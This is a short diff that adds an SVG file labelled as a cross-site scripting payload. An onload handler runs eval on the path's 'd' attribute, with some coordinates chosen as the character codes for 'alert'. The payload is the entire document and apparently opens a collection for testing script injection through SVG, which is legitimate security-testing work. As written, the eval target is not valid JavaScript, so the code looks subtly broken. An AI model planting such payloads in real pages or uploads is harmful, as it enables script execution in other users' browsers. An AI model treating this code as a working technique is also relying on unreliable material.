@@ -1,0 +1,6 @@
+<!-- Payload 1: Basic alert encoding -->
+<svg version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M 97,108 101,114 116,97 L 116,40 Q 90,10 50,10 Q 10,10 10,40 L 97,108 
+          C 97,108 114,116,99,67 T 99,67 z" 
+        onload="eval(this.getAttribute('d'))" />
+</svg>
